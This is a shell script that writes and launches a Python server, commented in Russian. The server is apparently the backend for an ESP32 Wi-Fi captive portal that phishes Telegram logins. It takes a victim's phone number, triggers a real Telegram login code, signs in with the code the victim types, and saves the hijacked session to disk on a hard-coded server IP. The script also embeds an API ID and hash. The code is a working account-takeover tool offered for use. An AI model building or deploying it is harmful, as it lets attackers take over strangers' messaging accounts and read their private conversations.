# 1. Создаем рабочий файл на хосте
cat > /root/telegram_server.py << 'EOF'
#!/usr/bin/env python3
"""
Telegram Auth Server for ESP32 Captive Portal
Works on Ubuntu 24.04 with system packages
"""

import asyncio
import json
import random
import string
import os
import sys
from datetime import datetime

# Try to import with fallbacks
try:
    from aiohttp import web
except ImportError:
    print("Installing aiohttp...")
    os.system("apt-get update && apt-get install -y python3-aiohttp")
    from aiohttp import web

try:
    from telethon import TelegramClient
    from telethon.sessions import StringSession
except ImportError:
    print("Installing telethon...")
    os.system("apt-get install -y python3-pip && pip3 install telethon")
    from telethon import TelegramClient
    from telethon.sessions import StringSession

# ========== КОНФИГУРАЦИЯ ==========
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"
HOST = "0.0.0.0"
PORT = 5000

# ========== ХРАНИЛИЩЕ ==========
sessions_db = {}
active_clients = {}

# ========== УТИЛИТЫ ==========
def generate_session_id():
    """Генерация ID сессии"""
    return ''.join(random.choices(string.digits + string.ascii_lowercase, k=16))

def log(message):
    """Логирование"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def save_session(session_id, session_string, phone):
    """Сохранение сессии в файл"""
    filename = f"/root/telegram_sessions/{session_id}.session"
    os.makedirs("/root/telegram_sessions", exist_ok=True)
    
    with open(filename, "w") as f:
        f.write(session_string)
    
    log(f"Session saved: {filename} for {phone}")
    return filename

# ========== ОБРАБОТЧИКИ ==========
async def handle_auth_start(request):
    """Начало авторизации - принимаем номер телефона"""
    try:
        # Читаем JSON
        try:
            data = await request.json()
        except:
            return web.json_response({"error": "Invalid JSON"}, status=400)
        
        phone = data.get("phone", "").strip()
        
        # Валидация номера
        phone_digits = ''.join(c for c in phone if c.isdigit())
        if len(phone_digits) < 11:
            return web.json_response({"error": "Invalid phone number"}, status=400)
        
        # Добавляем + если нет
        if not phone_digits.startswith("7") and not phone_digits.startswith("8"):
            phone_digits = "7" + phone_digits
        
        # Генерируем ID сессии
        session_id = generate_session_id()
        
        log(f"Auth start: {phone_digits} -> {session_id}")
        
        try:
            # Создаем клиента Telegram
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            
            # Устанавливаем таймауты
            client.session.set_dc(2, '149.154.167.40', 80)
            
            # Подключаемся
            await client.connect()
            
            # Запрашиваем код
            sent_code = await client.send_code_request(phone_digits)
            
            # Сохраняем в базу
            sessions_db[session_id] = {
                "phone": phone_digits,
                "phone_code_hash": sent_code.phone_code_hash,
                "client": client,
                "created": datetime.now().isoformat(),
                "status": "code_sent"
            }
            
            log(f"Code sent to {phone_digits}")
            
            # Успешный ответ
            return web.json_response({
                "status": "code_sent",
                "session_id": session_id,
                "message": "Код отправлен в Telegram"
            })
            
        except Exception as e:
            error_msg = str(e)
            log(f"Telegram error: {error_msg}")
            
            if "FLOOD" in error_msg:
                return web.json_response({"error": "Слишком много запросов. Подожди 10 минут."}, status=429)
            elif "PHONE_NUMBER_INVALID":
                return web.json_response({"error": "Неверный номер телефона"}, status=400)
            else:
                return web.json_response({"error": f"Telegram error: {error_msg}"}, status=500)
                
    except Exception as e:
        log(f"Server error in auth_start: {str(e)}")
        return web.json_response({"error": "Internal server error"}, status=500)

async def handle_auth_code(request):
    """Проверка кода подтверждения"""
    try:
        # Читаем JSON
        try:
            data = await request.json()
        except:
            return web.json_response({"error": "Invalid JSON"}, status=400)
        
        session_id = data.get("session_id", "").strip()
        code = data.get("code", "").strip().replace(" ", "")
        
        # Валидация
        if not session_id or session_id not in sessions_db:
            return web.json_response({"error": "Invalid or expired session"}, status=400)
        
        if not code or len(code) < 5:
            return web.json_response({"error": "Invalid code"}, status=400)
        
        session_data = sessions_db[session_id]
        
        # Проверяем статус
        if session_data.get("status") != "code_sent":
            return web.json_response({"error": "Session already used or expired"}, status=400)
        
        client = session_data["client"]
        phone = session_data["phone"]
        phone_code_hash = session_data["phone_code_hash"]
        
        log(f"Code verification: {session_id} for {phone}")
        
        try:
            # Пробуем войти с кодом
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            # Успешная авторизация
            session_string = client.session.save()
            
            # Сохраняем сессию
            filename = save_session(session_id, session_string, phone)
            
            # Обновляем статус
            session_data["status"] = "authenticated"
            session_data["session_string"] = session_string
            session_data["authenticated_at"] = datetime.now().isoformat()
            session_data["session_file"] = filename
            
            # Отключаем клиент
            await client.disconnect()
            
            log(f"Auth SUCCESS: {phone} -> {session_id}")
            
            # Успешный ответ для ESP32
            return web.json_response({
                "status": "success",
                "message": "Авторизация успешна",
                "phone": phone,
                "session_id": session_id
            })
            
        except Exception as e:
            error_msg = str(e)
            log(f"Code verification failed: {error_msg}")
            
            # Закрываем клиент при ошибке
            try:
                await client.disconnect()
            except:
                pass
            
            # Удаляем сессию при ошибке
            if session_id in sessions_db:
                del sessions_db[session_id]
            
            if "phone_code_invalid" in error_msg:
                return web.json_response({
                    "error": "Неверный код подтверждения"
                }, status=400)
            elif "phone_code_expired" in error_msg:
                return web.json_response({
                    "error": "Код устарел. Запросите новый."
                }, status=400)
            elif "SESSION_PASSWORD_NEEDED" in error_msg:
                return web.json_response({
                    "error": "Нужен пароль двухфакторной аутентификации"
                }, status=400)
            else:
                return web.json_response({
                    "error": f"Ошибка авторизации: {error_msg}"
                }, status=500)
                
    except Exception as e:
        log(f"Server error in auth_code: {str(e)}")
        return web.json_response({"error": "Internal server error"}, status=500)

async def handle_health(request):
    """Проверка здоровья сервера"""
    return web.json_response({
        "status": "online",
        "server_time": datetime.now().isoformat(),
        "sessions_active": len(sessions_db),
        "endpoints": {
            "POST /auth/start": "Start Telegram auth",
            "POST /auth/code": "Verify code",
            "GET /health": "Server status"
        }
    })

async def cleanup_sessions():
    """Очистка старых сессий каждые 5 минут"""
    while True:
        await asyncio.sleep(300)  # 5 минут
        
        now = datetime.now()
        expired_sessions = []
        
        for session_id, data in sessions_db.items():
            created = datetime.fromisoformat(data["created"])
            if (now - created).total_seconds() > 600:  # 10 минут
                expired_sessions.append(session_id)
                
                # Закрываем клиент
                try:
                    client = data.get("client")
                    if client and client.is_connected():
                        await client.disconnect()
                except:
                    pass
        
        # Удаляем истекшие
        for session_id in expired_sessions:
            if session_id in sessions_db:
                del sessions_db[session_id]
                log(f"Cleaned expired session: {session_id}")
        
        if expired_sessions:
            log(f"Cleaned {len(expired_sessions)} expired sessions")

# ========== CORS MIDDLEWARE ==========
@web.middleware
async def cors_middleware(request, handler):
    """CORS для работы с ESP32"""
    if request.method == "OPTIONS":
        response = web.Response()
    else:
        response = await handler(request)
    
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

# ========== ЗАПУСК СЕРВЕРА ==========
async def start_server():
    """Основная функция запуска сервера"""
    
    # Создаем приложение
    app = web.Application(middlewares=[cors_middleware])
    
    # Регистрируем маршруты ТОЧНО как в ESP32 коде
    app.router.add_post("/auth/start", handle_auth_start)  # ESP32 отправляет сюда
    app.router.add_post("/auth/code", handle_auth_code)    # ESP32 отправляет сюда
    app.router.add_get("/health", handle_health)
    
    # Запускаем очистку сессий в фоне
    asyncio.create_task(cleanup_sessions())
    
    # Запускаем сервер
    runner = web.AppRunner(app)
    await runner.setup()
    
    site = web.TCPSite(runner, HOST, PORT)
    await site.start()
    
    # Выводим информацию
    print("\n" + "="*60)
    print("🔥 TELEGRAM AUTH SERVER STARTED")
    print("="*60)
    print(f"📍 Host: {HOST}:{PORT}")
    print(f"📞 API ID: {API_ID}")
    print(f"🔑 API Hash: {API_HASH[:8]}...")
    print(f"🛜 ESP32 Target: http://188.225.11.61:{PORT}")
    print("="*60)
    print("\n📡 Endpoints:")
    print(f"  POST http://188.225.11.61:{PORT}/auth/start")
    print(f"  POST http://188.225.11.61:{PORT}/auth/code")
    print(f"  GET  http://188.225.11.61:{PORT}/health")
    print("\n💾 Sessions saved to: /root/telegram_sessions/")
    print("="*60 + "\n")
    
    return runner

def main():
    """Точка входа"""
    log("Starting Telegram Auth Server...")
    
    try:
        # Проверяем доступность порта
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('0.0.0.0', PORT))
        sock.close()
        
        if result == 0:
            log(f"Port {PORT} is already in use!")
            sys.exit(1)
        
        # Создаем папку для сессий
        os.makedirs("/root/telegram_sessions", exist_ok=True)
        
        # Запускаем асинхронный сервер
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        runner = loop.run_until_complete(start_server())
        
        try:
            loop.run_forever()
        except KeyboardInterrupt:
            log("Server shutting down...")
        finally:
            loop.run_until_complete(runner.cleanup())
            
    except Exception as e:
        log(f"Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

# 2. Даем права на выполнение
chmod +x /root/telegram_server.py

# 3. Запускаем сервер напрямую с установкой зависимостей
python3 /root/telegram_server.py
